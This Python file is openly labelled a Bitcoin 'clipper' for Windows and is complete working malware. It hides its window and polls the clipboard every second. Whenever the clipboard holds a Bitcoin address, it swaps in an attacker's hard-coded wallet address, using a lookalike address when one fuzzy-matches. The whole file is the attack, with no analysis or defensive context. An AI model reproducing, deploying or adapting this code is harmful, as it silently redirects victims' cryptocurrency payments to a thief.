from difflib import get_close_matches
from tkinter import Tk
import subprocess
import time
import os
import re

if os.name != 'nt':
    os._exit(0)
#Windows check

root = Tk()
root.withdraw()
#Hiding tkinter

class Clip:
    '''
    Basic Bitcoin Clipper for Windows, which tries to fetch,
    the closest matching BTC address based on clipboard data
    '''

    def __init__(self):
        self.wallets = ['bc1q53g2ncpm78nn2y832sfqjdqlp06z9nz93aqfav'] #First address should be the MAIN BTC address
        self.address_regex = r'\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b'

    def closest_match(self, address):
        return get_close_matches(address, self.wallets)

    def validate_address(self, data):
        if re.match(self.address_regex, data):
            return True
        else:
            return False

    def btc_clipper(self):
        while True:
            try:
                clipboad_data = root.clipboard_get()

                if clip.validate_address(clipboad_data):
                    address_matches = clip.closest_match(clipboad_data)

                    if address_matches:
                        subprocess.Popen(['clip'], shell=True, stdin=subprocess.PIPE, encoding='utf8').communicate(address_matches[0].strip())

                    elif not address_matches:
                        subprocess.Popen(['clip'], shell=True, stdin=subprocess.PIPE, encoding='utf8').communicate(self.wallets[0].strip())

            except Exception:
                pass

            time.sleep(1)

if __name__ == '__main__':
    clip = Clip()
    clip.btc_clipper()
